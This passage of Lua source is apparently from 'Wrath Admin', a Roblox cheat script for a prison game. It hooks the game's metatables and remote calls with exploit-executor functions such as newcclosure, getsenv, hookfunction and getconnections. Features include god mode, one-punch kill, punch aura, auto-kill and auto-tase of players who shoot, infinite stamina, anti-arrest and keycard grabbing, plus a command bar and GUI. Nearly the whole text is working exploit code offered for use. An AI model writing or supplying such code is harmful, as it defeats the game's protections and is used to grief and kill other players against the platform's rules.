                        if AnimationTrack.Animation.AnimationId == "rbxassetid://484200742" or AnimationTrack.Animation.AnimationId == "rbxassetid://484926359" or AnimationTrack.Animation.AnimationId == "rbxassetid://275012308" then
                            pcall(function()
                                local VPos = Char:FindFirstChildOfClass("Part").Position
                                local LPos = LocalPlayer.Character.HumanoidRootPart.Position
                                local Angle = math.deg(math.acos(Char.HumanoidRootPart.CFrame.LookVector.unit:Dot((LPos-VPos).unit)))
                                if Angle < 65 and (LPos-VPos).Magnitude <= 7 then
                                    for i = 1, 15 do
                                        MeleeEvent(PLR);
                                    end;
                                end;
                            end);
                        end;
                    end;
                end);
            end;
        end;
    end);
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        if v.Character then
            AntiPunchPlayerAdded(v);
            local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
            if Humanoid then
                Humanoid.AnimationPlayed:Connect(function(AnimationTrack)
                    if States.AntiPunch and CheckProtected(v, "killcmds") then
                        if AnimationTrack.Animation.AnimationId == "rbxassetid://484200742" or AnimationTrack.Animation.AnimationId == "rbxassetid://484926359" or v.Character:FindFirstChild("Hammer") or v.Character:FindFirstChild("Crude Knife") then
                            pcall(function()
                                local VPos = v.Character:FindFirstChildOfClass("Part").Position
                                local LPos = LocalPlayer.Character.HumanoidRootPart.Position
                                local Angle = math.deg(math.acos(v.Character.HumanoidRootPart.CFrame.LookVector.unit:Dot((LPos-VPos).unit)))
                                if Angle < 50 and (LPos-VPos).Magnitude <= 7 then
                                    for i = 1, 15 do
                                        MeleeEvent(v);
                                    end;
                                end;
                            end);
                        end;
                    end;
                end);
            end;
        end;
    end;
end;

Players.PlayerAdded:Connect(AntiPunchPlayerAdded)

--// God Mode:
task.spawn(function()
    while task.wait(0.03) do
        if States.GodMode and not States.GivingKeycard then
            if LocalPlayer.Character then
                local Hum = LocalPlayer.Character:FindFirstChild("Humanoid"); 
                if Hum then
                    LoadPos();
                    local Fake = Hum:Clone();
                    Hum:Destroy();
                    Fake.Parent = LocalPlayer.Character;
                    pcall(function()
                        LocalPlayer.Character.Animate.Disabled = true;
                        LocalPlayer.Character.Animate.Disabled = false;
                        Camera.CameraSubject = CurrentlyViewing.Player.Character;
                    end);
                    LocalPlayer.CharacterRemoving:wait();
                    SavePos();
                end;
            end;
        end;
    end;
end)

--// Forcefield:
task.spawn(function()
    while rService.RenderStepped:wait() do
        if States.Forcefield then
            if LocalPlayer.Character then
                Loadchar("Really red");
                TeamEvent("Medium stone grey");
                LoadPos();
                task.wait(9);
                SavePos();
            end;
        end;
    end;
end)

--// One Punch:
UserInputService.InputBegan:Connect(function(INPUT)
    if States.OnePunch and INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode.F then
        if not States.PunchAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if v.Character then
                        pcall(function()
                            local VPart = v.Character.PrimaryPart;
                            local PPart = LocalPlayer.Character.PrimaryPart;
                            local Angle = math.deg(math.acos(LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.unit:Dot((VPart.Position-PPart.Position).unit)))
                            if Angle < 50 and (PPart.Position-VPart.Position).Magnitude <= 7 then
                                for i = 1, 15 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end);
                    end;
                end;
            end;
        else
            local Character = ClosestCharacter(20);
            if Character then
                for i = 1, 15 do
                    MeleeEvent(Players:GetPlayerFromCharacter(Character));
                end;
            end;
        end;
    end;
end);


--// Anti Armor Spam:
task.spawn(function()
    while task.wait(0.03) do
        for i,v in pairs(Players:GetPlayers()) do
            if v.Character then
                for _,object in pairs(v.Character:GetChildren()) do
                    if object.Name == "vest" then
                        object:Destroy();
                        if not ArmorSpamFlags[v.Name] then
                            ArmorSpamFlags[v.Name] = 1;
                        else
                            ArmorSpamFlags[v.Name] = ArmorSpamFlags[v.Name] + 1;
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

--// Anti Arrest Lag:
Info.Arrest = 0;
task.spawn(function()
    while task.wait(0.03) do
        for i,v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character then
                local Head = v.Character:FindFirstChild("Head");
                if Head then
                    for _,object in pairs(Head:GetChildren()) do
                        if object.Name == "handcuffedGui" then
                            object:Destroy();
                        end;
                    end;
                end
            end;
        end;
    end;
end)

--// Anti Void:
task.spawn(function()
    while task.wait(0.03) do
        if LocalPlayer.Character then
            if LocalPlayer.Character.PrimaryPart then
                if LocalPlayer.Character.PrimaryPart.Position.Y < 1 then
                    Teleport(LocalPlayer, CFrame.new(888, 100, 2388));
                    pcall(function()
                        for i,v in pairs(LocalPlayer.Character:GetChildren()) do
                            if v:IsA("BasePart") then
                                v.Velocity = Vector3.new();
                            end;
                        end;
                    end)
                end;
            end;
        end;
    end;
end)

--// Inf Ammo Auto Reload:
task.spawn(function()
    while task.wait(1) do
        if next(AmmoGuns) then
            for i,v in next, AmmoGuns do
                rStorage.ReloadEvent:FireServer(v);
            end;
        end;
    end;
end)

--// Spam Punch:
task.spawn(function()
    while task.wait(0.03) do
        if States.SpamPunch and PunchFunction then
            if UserInputService:IsKeyDown(Enum.KeyCode.F) then
                coroutine.wrap(PunchFunction)();
            end;
        end;
    end;
end)

--// Anti Fling:
rService.Stepped:Connect(function()
    if States.AntiFling then
        for i,v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer then
                if v.Character then
                    for _,object in pairs(v.Character:GetChildren()) do
                        if object:IsA("BasePart") then
                            object.CanCollide = false;
                        end;
                        if object:IsA("Accessory") then
                            pcall(function()
                                object.Handle.CanCollide = false;
                            end);
                        end;
                    end; 
                end;
            end;
        end;
    end;
end);

--// Anti Bring:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    CHAR.ChildAdded:Connect(function(ITEM)
        if States.AntiBring then
            if ITEM:IsA("Tool") then
                if not CheckWhitelisted(ITEM) then
                    pcall(function()
                        LocalPlayer.Character.Torso.Anchored = true
                        LocalPlayer.Character.Torso.Anchored = false
                    end);
                    ITEM:Destroy();
                    rService.RenderStepped:wait();
                    pcall(function()
                        ITEM:Destroy();
                    end);
                end;
            end;
        end;
    end);
end);

--// Anti Bring
for Index, ITEM in pairs(LocalPlayer.Backpack:GetChildren()) do
    if States.AntiBring then
        if ITEM:IsA("Tool") then
            if not CheckWhitelisted(ITEM) then
                ITEM:Destroy();
            end
            rService.RenderStepped:wait();
            pcall(function()
                ITEM:Destroy();
            end);
        end
    end
end

--// Anti Bring
for Index, ITEM in pairs(LocalPlayer.Character:GetChildren()) do
    if States.AntiBring then
        if ITEM:IsA("Tool") then
            if not CheckWhitelisted(ITEM) then
                ITEM:Destroy();
            end
            rService.RenderStepped:wait();
            pcall(function()
                ITEM:Destroy();
            end);
        end
    end
end


--// Anti Spam Arrest
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if not Info.StopRespawnLag then
        local ClientInputHandler = CHAR:WaitForChild("ClientInputHandler", 1);
        if ClientInputHandler then
            --YieldUntilScriptLoaded(ClientInputHandler);
            task.wait(1);
            pcall(function()
                local Senv = getsenv(ClientInputHandler);
                local OldMT = Senv.cs;
                Senv.cs = setmetatable({},{
                    __newindex = function(Table, Index, Value)
                        if Index == "isArrested" and Value == true then
                            pcall(function()
                                Loadchar("Bright blue");
                                LoadPos();
                                HasBeenArrested = true;
                            end);
                        end;
                        if Index == "isFighting" then
                            Value = false;
                        end
                        if Index == "isCrouching" then
                            Info.Crouching = Value;
                        end;
                        OldMT[Index] = Value;
                    end;
                    __index = OldMT;
                });
            end);
        end;
        --// Anti Tase:
        task.spawn(function()
            task.wait(1);
            for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
                v:Disable();
            end;
        end);
    end;
end);

--[[local ClientInputHandler = game:GetService("StarterPlayer").StarterCharacterScripts.ClientInputHandler
if ClientInputHandler then
    --YieldUntilScriptLoaded(ClientInputHandler);
    local Senv = getsenv(ClientInputHandler);
    local OldMT = Senv.cs;
    Senv.cs = setmetatable({},{
        __newindex = function(Table, Index, Value)
            if Index == "isArrested" and Value == true then
                pcall(function()
                    LocalPlayer.Character:Destroy();
                    Loadchar("Bright blue");
                    LoadPos();
                    HasBeenArrested = true;
                end);
            end;
            if Index == "isFighting" then
                Value = false;
            end
            if Index == "isCrouching" then
                Info.Crouching = Value;
            end;
            OldMT[Index] = Value;
        end;
        __index = OldMT;
    });

    --// Anti Tase:
    task.spawn(function()
        task.wait(1);
        for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
            v:Disable();
        end;
    end);
end;]]

task.spawn(function()
    while rService.Heartbeat:wait() do
        pcall(function()
            if LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
                Loadchar("Bright blue");
                LoadPos();
                HasBeenArrested = true;
            end;
        end);
    end;
end)

--// Auto Anti Spam Arrest
Info.LastArrestTime = 0;
Info.LastNotifiedArrest = 0;
Info.Arrested = 0;
LocalPlayer.CharacterAdded:Connect(function(Char)
    local Head = Char:WaitForChild("Head", 1);
    if Head then
        Head.ChildAdded:Connect(function(Child)
            if Child.Name == "handcuffedGui" then
                if tick() - Info.LastArrestTime <= 0.1 then
                    Info.Arrested = Info.Arrested + 1;
                    Info.LastArrestTime = tick()
                else
                    Info.Arrested = 0;
                    Info.LastArrestTime = tick()
                end;
                if Info.Arrested >= 2 then
                    if tick() - Info.LastNotifiedArrest >= 5 then
                        Notify("Success", "Wrath Admin has detected a spam arrest exploit and turned on anti-criminal + anti-bring.", 5);
                        Info.LastNotifiedArrest = tick();
                    end;
                    ChangeGuiToggle(true, "Anti-Criminal");
                    ChangeGuiToggle(true, "Anti-Bring");
                    Loadchar("Bright blue")
                    States.AntiCriminal = true
                    States.AntiBring = true;
                    States.GodMode = true
                    States.NoClip = true
                end;
                coroutine.wrap(function()
                    task.wait()
                    Child:Destroy()
                end)()
                --print(Info.Arrested)
            end;
        end);
    end;
end);

Info.LastRespawnTime = 0;
LocalPlayer.CharacterAdded:Connect(function(Char)
    if tick() - Info.LastRespawnTime <= 0.5 then
        Info.StopRespawnLag = true;
    else
        Info.StopRespawnLag = false;
    end;
    Info.LastRespawnTime = tick();
end)

--// Anti Crash:
task.spawn(function()
    for i,v in pairs(getconnections(rStorage:WaitForChild("ReplicateEvent").OnClientEvent)) do
        v:Enable();
    end;
end);
local KillDebounce = 0.2;
local TeleportDebounce = 0.5;
local CurrentTime = 0;
local TeleportTime = 0;

--// Get Player Hit
function GetPlayerHit(Part)
    for i,v in pairs(Players:GetPlayers()) do
        if v.Character:IsAncestorOf(Part) then
            return v;
        end;
    end;
end;

--// Combat Logs:
local function OnReplicateEvent(Args)
    --[[if States.CombatLogs then
        print("=== SHOT GUN ===");
    end;]]
    local Count = 0;
    if not States.AntiCrash then
        pcall(function()
            for i,v in next, Args do
                if Count <= 5 then
                    local Hit, Distance, Cframe, RayObject = v.Hit, v.Distance, v.Cframe, v.RayObject;
                    if Hit and Distance and Cframe then
                        if Cframe ~= CFrame.new() then
                            local PlayerHit, WhoShot = GetPlayerHit(Hit) --Players:GetPlayerFromCharacter(Hit.Parent);

                            local CalculatedCFrame = Cframe * CFrame.new(0, 0, -Distance / 2);

                            local Success, Error = pcall(function()
                                WhoShot = GetClosestPlayerToPosition(CalculatedCFrame.p)
                            end)
                            
                            local ShotWith = WhoShot.Character:FindFirstChildOfClass("Tool");

                            if Success and WhoShot then
                                local Hit, HitPosition = workspace:FindPartOnRay(RayObject, WhoShot.Character)

                                if States.CombatLogs then
                                    if PlayerHit then
                                        print("Bullet -- " .. tostring(i));
                                        print("Shot From:", WhoShot, "(" .. tostring(WhoShot.Team) .. ")");
                                        if PlayerHit then
                                            print("Hit Player:", PlayerHit, "(" .. tostring(PlayerHit.Team) .. ")");
                                        else
                                            print("Hit Part:", Hit);
                                        end;
                                        print("Shot With:", ShotWith);
                                        print("Distance:", Distance);
                                    end;
                                end;
                                if States.ShootBack then
                                    if PlayerHit then
                                        if PlayerHit == LocalPlayer then
                                            if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor ~= LocalPlayer.TeamColor then
                                                if tick() - CurrentTime >= KillDebounce then
                                                    CurrentTime = tick();
                                                    if LocalPlayer.Character.Humanoid.Health <= 0 then
                                                        LocalPlayer.CharacterAdded:wait()
                                                    end;
                                                    Kill({WhoShot});
                                                end;
                                            end;
                                        end;
                                    end;
                                end;
                                if States.TaseBack then
                                    if PlayerHit then
                                        if PlayerHit == LocalPlayer and PlayerHit.TeamColor.Name ~= "Bright blue" then
                                            if CheckProtected(WhoShot, "killcmds") then
                                                if tick() - CurrentTime >= KillDebounce then
                                                    CurrentTime = tick();
                                                    Tase({WhoShot});
                                                end;
                                            end;
                                        end;
                                    end;
                                end;
                                if PlayerHit and WhoShot then
                                    if Oneshots[WhoShot.UserId] then
                                        if CheckProtected(PlayerHit, "killcmds") and WhoShot.TeamColor ~= PlayerHit.TeamColor then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Kill({PlayerHit});
                                            end;
                                        end;
                                    end;
                                    if AntiShoots[PlayerHit.UserId] then
                                        if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor ~= PlayerHit.TeamColor then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Kill({WhoShot})
                                            end;
                                        end;
                                    end;
                                    if TaseBacks[PlayerHit.UserId] then
                                        if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor.Name ~= "Bright blue" then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Tase({WhoShot})
                                            end;
                                        end;
                                    end;
                                end;
                                if Hit and HitPosition and WhoShot then
                                    if ClickTeleports[WhoShot.UserId] then
                                        if tick() - CurrentTime >= TeleportDebounce then
                                            CurrentTime = tick();
                                            Teleport(WhoShot, CFrame.new(HitPosition) * CFrame.new(0, 2, 0));
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                    Count = Count + 1
                end;
            end;
        end);
    end;
    --[[if States.CombatLogs then
        print("=== END ===");
    end;]]
end;

task.spawn(function()
    rStorage:WaitForChild("ReplicateEvent").OnClientEvent:Connect(OnReplicateEvent);
end);
--// Friendly Fire + Disable Gun Animations

local DebounceTime = 0;

MT.__namecall = newcclosure(loadstring([[
    local __Namecall, States, Info, Players, ClosestCharacter, LocalPlayer, MeleeEvent, DebounceTime, rStorage = ...
    return function(Self, ...)
        local Args = {...}
        local Method = getnamecallmethod();

        if States.FriendlyFire and Method == "FireServer" and tostring(Self) == "ShootEvent" then
            local ValidPlayer = Players.GetPlayerFromCharacter(Players, Args[1][1].Hit.Parent) or Players.GetPlayerFromCharacter(Players, Args[1][1].Hit);
            if ValidPlayer then
                task.spawn(function()
                    if Info.FriendlyFireOldTeam == "Bright orange" or Info.FriendlyFireOldTeam == "Bright blue" then
                        workspace.Remote.TeamEvent:FireServer("Medium stone grey");
                        task.wait(0.03);
                        workspace.Remote.TeamEvent:FireServer(Info.FriendlyFireOldTeam);
                    end;
                end)
            end;
        end;
        if States.OneShot and Method == "FireServer" and tostring(Self) == "ShootEvent" then
            local ValidPlayer = Players.GetPlayerFromCharacter(Players, Args[1][1].Hit.Parent) or Players.GetPlayerFromCharacter(Players, Args[1][1].Hit);
            if ValidPlayer then
                if ValidPlayer.TeamColor ~= LocalPlayer.TeamColor then
                    coroutine.wrap(Kill)({ValidPlayer});
                end;
            end;
        end;
        if States.PunchAura and not Info.Crouching then
            if Method == "FindPartOnRay" and tostring(getfenv(0).script) ~= "GunInterface" and tostring(getfenv(0).script) ~= "TaserInterface" then
                if LocalPlayer.Character then
                    if LocalPlayer.Character.PrimaryPart then
                        local Character = ClosestCharacter(math.huge);
                        if Character then
                            if game.FindFirstChild(Character, "Head") then
                                return Character.Head, Character.Head.Position;
                            end;
                        end;
                    end;
                end;
            end;
        end;
        if States.LoudPunch then
            if Method == "FireServer" and tostring(Self) == "meleeEvent" then
                pcall(function()
                    for i,v in pairs(Workspace:GetChildren()) do
                        if game.Players:FindFirstChild(v.Name) then
                            s = v.Head.punchSound
                            s.Volume = math.huge
                            game:GetService("ReplicatedStorage").SoundEvent:FireServer(s)
                        end
                    end
                end)
            end;
        end
        return __Namecall(Self, unpack(Args));
    end;
]])(__Namecall, States, Info, Players, ClosestCharacter, LocalPlayer, MeleeEvent, DebounceTime, rStorage));

--// Anti Trip:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    local Humanoid = CHAR:WaitForChild("Humanoid", 1);
    if Humanoid then
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false);
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false);
    end
end);

--// Auto Gun Mods:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    CHAR.ChildAdded:Connect(function(Tool)
        ModGun(Tool);
    end);
end);

--// Metatable Hooks:
MT.__index = newcclosure(loadstring([[
    local IndexMT = ...
    return function(Table, Index)
        if tostring(Table) == "Status" then
            if tostring(Index) == "isBadGuard" or tostring(Index) == "toolIsEquipped" then
                return false;
            end;
            if tostring(Index) == "playerCell" then
                return nil;
            end
        end;
        if tostring(Table) == "Humanoid" and Index == "PlatformStand" then
            return false;
        end;
        return IndexMT(Table, Index)
    end;
]])(IndexMT));

--// INF stamina:
MT.__newindex = newcclosure(loadstring([[
    local NewIndex = ...
    return function(Table, Index, Value)
        if tostring(Table) == "Humanoid" and Index == "Jump" and not Value then
            return
        end;

        return NewIndex(Table, Index, Value);
    end;
]])(NewIndex));

loadstring([[
    local TooltipModule = ...
    local OldUpdate = TooltipModule.update
    OldUpdate = hookfunction(TooltipModule.update, function(Message)
        if Message == "You don't have enough stamina!" then
            return
        end;
        return OldUpdate(Message)
    end);
]])(TooltipModule);

--// Anti Criminal:
--[[LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function()
    if tostring(LocalPlayer.Team) ~= "Guards" and #Teams.Guards:GetPlayers() >= 8 and not States.SpamArresting and not States.Forcefield and States.AntiCriminal then
        SavePos();
        Loadchar("Bright blue")
        LoadPos();
    end;
end);]]

rService.Heartbeat:Connect(function()
    if States.AntiCriminal then
        if #Teams.Guards:GetPlayers() < 8 then
            coroutine.wrap(TeamEvent)("Bright blue")
        elseif #Teams.Guards:GetPlayers() > 8 then
            if not Info.RespawnPaused and not Info.HasDied and not Info.LoadingNeutralChar then
                coroutine.wrap(TeamEvent)("Medium stone grey")
            end;
        elseif #Teams.Guards:GetPlayers() == 8 then
            if LocalPlayer.TeamColor.Name == "Bright blue" and not Info.LoadingNeutralChar then
                coroutine.wrap(TeamEvent)("Bright blue")
            else
                if not Info.RespawnPaused and not Info.HasDied and not Info.LoadingNeutralChar then
                    coroutine.wrap(TeamEvent)("Medium stone grey")
                end;
            end;
        end;
    end;
end);

--kcf
task.spawn(function()
    while task.wait(0.03) do
        if States.Kcf then
		    workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP)
		    workspace.Prison_ITEMS.single:FindFirstChild("Key card")
        end
    end
end)            

--// Rainbow Bullets
rService.RenderStepped:Connect(function()
    if States.Rb then
        local Tool = GetTool()
        if Tool then
            local Children = Tool:GetChildren()
            table.foreach(Children, function(Key, Child)
                if (Child.Name == "RayPart") then
                    Child.Color = BrickColor.random().Color
                end
            end)
        end
    end
end)

--// Rgb
task.spawn(function()
    while task.wait(0.03) do
        if States.Rgb then
            SavePos()
            Loadchar("Carnation pink");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Royal purple");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Lapis");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Cyan");
            wait(1)
            SavePos()
            Loadchar("Crimson");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("New Yeller");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar(Color3.fromRGB(255, 175, 0))
            LoadPos()
        end
    end
end)

--// Command Queue
task.spawn(function()
    while task.wait(0.03) do    
        for i, Command in next, CommandQueue do
            if next(CommandQueue) then
                Command();
                table.remove(CommandQueue, i);
                task.wait(1);
            end;
        end;
    end;
end)

--// Chat Queue:
task.spawn(function()
    while task.wait(0.03) do
        for i, Chat in next, ChatQueue do
            if next(ChatQueue) then
                Chat();
                table.remove(ChatQueue, i);
                task.wait(1);
            end;
        end;
    end;
end);

--// Command Bar:
-- Gui
local WrathCommandBar = Instance.new("ScreenGui")
local Bar = Instance.new("Frame")
local StartLine = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")

WrathCommandBar.Name = "WrathCommandBar"
WrathCommandBar.Parent = game.CoreGui
WrathCommandBar.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Bar.Name = "Bar"
Bar.Parent = WrathCommandBar
Bar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Bar.BackgroundTransparency = 0.500
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(1.49011612e-08, 0, 0.934272289, 0)
Bar.Size = UDim2.new(1, 0, 0.0657276958, 0)

StartLine.Name = "StartLine"
StartLine.Parent = Bar
StartLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StartLine.BackgroundTransparency = 1.000
StartLine.Size = UDim2.new(0.0509554148, 0, 1, 0)
StartLine.Font = Enum.Font.Code
StartLine.Text = ">"
StartLine.TextColor3 = Color3.fromRGB(255, 255, 255)
StartLine.TextScaled = true
StartLine.TextSize = 1.000
StartLine.TextWrapped = true

TextBox.Parent = Bar
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextBox.Position = UDim2.new(0.0509554148, 0, 0, 0)
TextBox.Size = UDim2.new(0.949044585, 0, 1, 0)
TextBox.Font = Enum.Font.Code
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.ClearTextOnFocus = false;
TextBox.TextXAlignment = Enum.TextXAlignment.Left

Bar.Position = UDim2.new(0, 0, 1, 0);

UserInputService.InputBegan:Connect(function(INPUT, CHATTING)
    if CHATTING then
        return
    end;
    if INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode[OpenCommandBarKey] then
        TextBox.Text = ""
        Bar:TweenPosition(UDim2.new(0, 0, 0.900, 0), "Out", "Quad", 0.2, true);
        task.wait(0.03)
        TextBox:CaptureFocus();
    end;
end);

TextBox.FocusLost:Connect(function()
    Bar:TweenPosition(UDim2.new(0, 0, 1, 0), "Out", "Quad", 0.2, true);
    coroutine.wrap(UseCommand)(Settings.Prefix .. TextBox.Text)
    task.wait(1/5);
    TextBox.Text = "";
end)

--// GUI
local function makeDraggable(obj) 
    --// Original code by Tiffblocks, edited so that it has a cool tween to it. 
    local gui = obj
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        local EndPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        local Tween = TweenService:Create(
            gui, 
            TweenInfo.new(0.2), 
            {Position = EndPos}
        )
        Tween:Play()
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end


-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------
-- Instances:

local MainGuiObjects = {
    WrathAdminGuiMain = Instance.new("ScreenGui");
    Stats = Instance.new("Frame");
    TemplateTopbar = Instance.new("Frame");
    TemplateTopbarRound = Instance.new("UICorner");
    TemplateTitle = Instance.new("TextLabel");
    PlayerListRound = Instance.new("UICorner");
    StatesListFrame = Instance.new("ScrollingFrame");
    UIListLayout = Instance.new("UIListLayout");
    Stat = Instance.new("TextButton");
    UICorner = Instance.new("UICorner");
    TextLabel = Instance.new("TextLabel");
    Stat_2 = Instance.new("TextButton");
    UICorner_2 = Instance.new("UICorner");
    TextLabel_2 = Instance.new("TextLabel");
    Stat_3 = Instance.new("TextButton");
    UICorner_3 = Instance.new("UICorner");
    TextLabel_3 = Instance.new("TextLabel");
    GetPlayers = Instance.new("Frame");
    TemplateTopbar_2 = Instance.new("Frame");
    TemplateTopbarRound_2 = Instance.new("UICorner");
    TemplateTitle_2 = Instance.new("TextLabel");
    PlayerListRound_2 = Instance.new("UICorner");
    GetPlayersContent = Instance.new("ScrollingFrame");
    TextButton = Instance.new("TextButton");
    UICorner_4 = Instance.new("UICorner");
    TextButton_2 = Instance.new("TextButton");
    UICorner_5 = Instance.new("UICorner");
    TextButton_3 = Instance.new("TextButton");
    UICorner_6 = Instance.new("UICorner");
    TextButton_4 = Instance.new("TextButton");
    UICorner_7 = Instance.new("UICorner");
    TextButton_5 = Instance.new("TextButton");
    UICorner_8 = Instance.new("UICorner");
    TextButton_6 = Instance.new("TextButton");
    UICorner_9 = Instance.new("UICorner");
    TextButton_7 = Instance.new("TextButton");
    UICorner_10 = Instance.new("UICorner");
    TextButton_8 = Instance.new("TextButton");
    UICorner_11 = Instance.new("UICorner");
    UIListLayout_2 = Instance.new("UIListLayout");
    TextButton_9 = Instance.new("TextButton");
    UICorner_12 = Instance.new("UICorner");
    PlayerList = Instance.new("Frame");
    ListTopbar = Instance.new("Frame");
    ListTopbarRound = Instance.new("UICorner");
    ListTitle = Instance.new("TextLabel");
    PlayerListFrame = Instance.new("ScrollingFrame");
    UIListLayout_3 = Instance.new("UIListLayout");
    TextButton_10 = Instance.new("TextButton");
    UICorner_13 = Instance.new("UICorner");
    PlayerListRound_3 = Instance.new("UICorner");
    Toggles = Instance.new("Frame");
    TogglesTopbar = Instance.new("Frame");
    TemplateTopbarRound_3 = Instance.new("UICorner");
    TogglesTitle = Instance.new("TextLabel");
    PlayerListRound_4 = Instance.new("UICorner");
    TogglesListFrame = Instance.new("ScrollingFrame");
    UIListLayout_4 = Instance.new("UIListLayout");
    Toggle = Instance.new("TextButton");
    UICorner_14 = Instance.new("UICorner");
    TextLabel_4 = Instance.new("TextLabel");
    Toggle_2 = Instance.new("TextButton");
    UICorner_15 = Instance.new("UICorner");
    TextLabel_5 = Instance.new("TextLabel");
    Toggle_3 = Instance.new("TextButton");
    UICorner_16 = Instance.new("UICorner");
    TextLabel_6 = Instance.new("TextLabel");
    Toggle_4 = Instance.new("TextButton");
    UICorner_17 = Instance.new("UICorner");
    TextLabel_7 = Instance.new("TextLabel");
    Toggle_5 = Instance.new("TextButton");
    UICorner_18 = Instance.new("UICorner");
    TextLabel_8 = Instance.new("TextLabel");
    Toggle_6 = Instance.new("TextButton");
    UICorner_19 = Instance.new("UICorner");
    TextLabel_9 = Instance.new("TextLabel");
    ImmunitySettings = Instance.new("Frame");
    ImmunityTopbar = Instance.new("Frame");
    TemplateTopbarRound_4 = Instance.new("UICorner");
    TogglesTitle_2 = Instance.new("TextLabel");
    PlayerListRound_5 = Instance.new("UICorner");
    ImmunityListFrame = Instance.new("ScrollingFrame");
    UIListLayout_5 = Instance.new("UIListLayout");
    Toggle_7 = Instance.new("TextButton");
    UICorner_20 = Instance.new("UICorner");
    TextLabel_10 = Instance.new("TextLabel");
    Toggle_8 = Instance.new("TextButton");
    UICorner_21 = Instance.new("UICorner");
    TextLabel_11 = Instance.new("TextLabel");
    Toggle_9 = Instance.new("TextButton");
    UICorner_22 = Instance.new("UICorner");
    TextLabel_12 = Instance.new("TextLabel");
    Toggle_10 = Instance.new("TextButton");
    UICorner_23 = Instance.new("UICorner");
    TextLabel_13 = Instance.new("TextLabel");
    Toggle_11 = Instance.new("TextButton");
    UICorner_24 = Instance.new("UICorner");
    TextLabel_14 = Instance.new("TextLabel");
    Toggle_12 = Instance.new("TextButton");
    UICorner_25 = Instance.new("UICorner");
    TextLabel_15 = Instance.new("TextLabel");
    AdminSettings = Instance.new("Frame");
    AdminTopbar = Instance.new("Frame");
    TemplateTopbarRound_5 = Instance.new("UICorner");
    TogglesTitle_3 = Instance.new("TextLabel");
    PlayerListRound_6 = Instance.new("UICorner");
    AdminListFrame = Instance.new("ScrollingFrame");
    UIListLayout_6 = Instance.new("UIListLayout");
    Toggle_13 = Instance.new("TextButton");
    UICorner_26 = Instance.new("UICorner");
    TextLabel_16 = Instance.new("TextLabel");
    Toggle_14 = Instance.new("TextButton");
    UICorner_27 = Instance.new("UICorner");
    TextLabel_17 = Instance.new("TextLabel");
    Toggle_15 = Instance.new("TextButton");
    UICorner_28 = Instance.new("UICorner");
    TextLabel_18 = Instance.new("TextLabel");
    Toggle_16 = Instance.new("TextButton");
    UICorner_29 = Instance.new("UICorner");
    TextLabel_19 = Instance.new("TextLabel");
    Toggle_17 = Instance.new("TextButton");
    UICorner_30 = Instance.new("UICorner");
    TextLabel_20 = Instance.new("TextLabel");
    Commands = Instance.new("Frame");
    CommandsTopbar = Instance.new("Frame");
    TemplateTopbarRound_6 = Instance.new("UICorner");
    TogglesTitle_4 = Instance.new("TextLabel");
